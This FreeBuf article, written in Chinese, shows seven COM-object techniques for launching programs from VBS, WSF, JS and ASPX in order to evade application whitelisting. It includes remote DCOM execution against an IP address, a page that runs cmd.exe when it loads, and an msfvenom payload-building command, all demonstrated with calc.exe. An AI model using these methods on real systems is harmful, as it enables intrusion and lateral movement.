@@ -1,0 +1,34 @@
+*本文原创作者：lcx，本文属FreeBuf原创奖励计划，未经许可禁止转载
+袁哥以前提出了一个很有深度的观点，VBS脚本代码是本身没有指针概念的，不过指针的本质就是数组。本着这一指导思想，他打开了VBS的上帝模式，在VBS虚拟机的软件栈中捞到了“失落的魔戒”。
+CVE-2013-3918、CVE-2014-6332(那个通杀全IE版本的网马)，都是用的dve数据虚拟执行技术对抗dep+aslr+emet+cfi。如果袁哥是在VBS的底层中操作，那么国外黑客enigma0x3一直在应用层中寻找那些失落的明珠，寻找了很多方法来进行白名单执行恶意程序的操作。在enigma0x3的博客中，他给出了3个利用脚本组件执行程序的名单，不过很可惜，他只给了powershell的代码，并没有给出vbs、asp、aspx之类的代码。我研究了一下，又归纳总结，这篇文章我给出vbs利用七种不同组件执行程序的多种方法。
+一、老生常谈的用WScript.Shell组件执行程序的方法
+大家都知道的vbs用WScript.Shell来执行程序的方法，有run和exec函数的（有些区别），代码如下：
+set WshShell = WScript.CreateObject("WScript.Shell") WshShell.Run "calc.exe" WshShell.exec("calc.exe")
+二、稍为进一层，用Shell.Application组件来执行程序，它有5种方法的，代码如下：
+Set objShellApp = CreateObject("Shell.Application") Set objFolder = objShellApp.NameSpace("c:\windows\system32\") objFolder.Items().item("calc.exe").invokeverb '方法1 objFolder.Items().item("calc.exe").InvokeVerbEx'方法2 objShellApp.Open("C:\windows\system32\calc.exe") '方法3 objShellApp.ShellExecute "calc.exe","","c:\windows\system32\","","1" '方法4,可以加参数和设置参数值 '方法5 Set objFolderItem = objShellApp.NameSpace("C:\windows\system32").Items().item("calc.exe") Set objFIVs = objFolderItem.Verbs() For i=0 To objFIVs.Count - 1 'MsgBox objFIVs.Item(i) Set objFIV = objFIVs.Item(i) If objFIV.Name = "打开(&O)" Then '右键菜单中在中文系统是"打开(&O)"，英文自己改 objFIV.DoIt Exit For End IF Next
+三、利用MMC20.Application组件来执行程序，代码如下：
+Set oHttp = CreateObject("MMC20.Application"): a=oHttp.Document.ActiveView.ExecuteShellCommand("calc.exe","d:\","","Minimized")
+ExecuteShellCommand的参数如下：
+View.ExecuteShellCommand( _ ByVal Command As String, _ ByVal Directory As String, _ ByVal Parameters As String, _ ByVal WindowState As String _ )
+由于此vbs代码本身需要管理员权限才能执行，所以我也未更改为asp或aspx代码。
+四、利用ShellWindows组件来执行程序
+这个就很有意思了，因为ShellWindows在注册表中只有classid，并没有progid，所以在vbs里你正常用Set xx = CreateObject("ShellWindows")是成功不了的。enigma0x3使用的是Type.GetTypeFromCLSID .NET方法与Activator.CreateInstance方法配对，从而在powershell下完成，代码是：
+$com=[type]::gettypefromclsid('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.1.100") $obj=[system.activator]::createinstance($com) $item=$obj.item() $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
+我们在vbs中就没有办法完成了吗？是可以的。还有一种文件格式后缀为wsf，在wsf中就可以直接调用classid了，有了wsf文件，你完全可以调用没有progid的组件，这会给你的vbs应用打开了另一扇门，代码如下：
+<Job ID="myjob"> <object id="ShellWindows" classiD="clsiD:9BA05972-F6A8-11CF-A442-00A0C90A8F39"/> <script language="VBScript"> set obj =ShellWindows.item() obj.Document.Application.ShellExecute "cmd.exe","/c calc.exe","c:\windows\system32","",0 </script> </Job>
+我又把它转为了aspx，代码如下：
+<%@ Page Language="C#" %> <%@ Import Namespace="System.Reflection" %> <!DOCTYPE html> <script runat="server"> protected void Page_Load(object sender, EventArgs e) { var typeShlWin = System.Type.GetTypeFromCLSID(Guid.Parse("9BA05972-F6A8-11CF-A442-00A0C90A8F39")); dynamic shlWin = System.Activator.CreateInstance(typeShlWin); shlWin.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", @"c:\windows\system32", "", 0); } </script> <html xmlns="http://www.w3.org/1999/xhtml"> <head runat="server"> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <title></title> </head> <body> <form id="form1" runat="server"> <div> </div> </form> </body> </html>
+很可惜，在当前的IIS权限下仍然不成功，需要高权限的IIS才能在进程中弹出计算器。
+五、利用ShellBrowserWindow来执行程序
+这个代码和上边的类似，所以不再赘述，我们仍然可以用wsf后缀的文件实现我们的功能
+<Job ID="myjob"> <object id="ShellBrowserWindow" classiD="clsiD:c08afd90-f2a1-11d1-8455-00a0c91f3880"/> <script language="VBScript"> ShellBrowserWindow.Document.Application.ShellExecute "cmd.exe","/c calc.exe","c:\windows\system32","",0 </script> </Job>
+六、利用Excel组件DDEInitiate和RegisterXL 来执行程序的方法
+'vbs
+Set obj = CreateObject("Excel.Application") Obj.DisplayAlerts = false Obj.DDEInitiate "cmd", "/c calc.exe"
+//JS
+var excel = new ActiveXObject("Excel.Application"); excel.RegisterXLL("d:\\calc.dll"); //msfvenom -f dll -a x86 --platform windows -o d:/calc.dll -p windows/exec CMD=calc.exe
+七、利用outlook.application来执行，代码仍然是wsf文件
+<Job ID="myjob"> <object id="outlook" classiD="clsiD:0006F03A-0000-0000-C000-000000000046"/> <script language="VBScript"> on error resume next set obj =outlook.CreateObject("ScriptControl") obj.language="javascript" code=createobject("scripting.filesystemobject").opentextfile("c:\calc.js").readall obj.addcode code </script> </Job>
+上述代码中的calc.js太长，我放在了http://www.haiyangtop.net/%E6%9C%80%E8%BF%91%E6%9B%B4%E6%96%B0%E7%9A%84vbs%E4%BB%A3%E7%A0%81/outlook.wsf.txt。它可以用 https://github.com/tyranid/DotNetToJScript/releases该工具生成。
+写到最后你可能会问我，如何在应用层找到vbs能调用组件的方法和属性。以前我都是用comradio、regdllview、oleview等工具来分析，现在有一个新的工具，有了这个，其它的你就可以扔掉了，就是oleviewdotnet。希望你也能用此工具，找到更多vbs的应用层明珠。
+*本文原创作者：lcx，本文属FreeBuf原创奖励计划，未经许可禁止转载
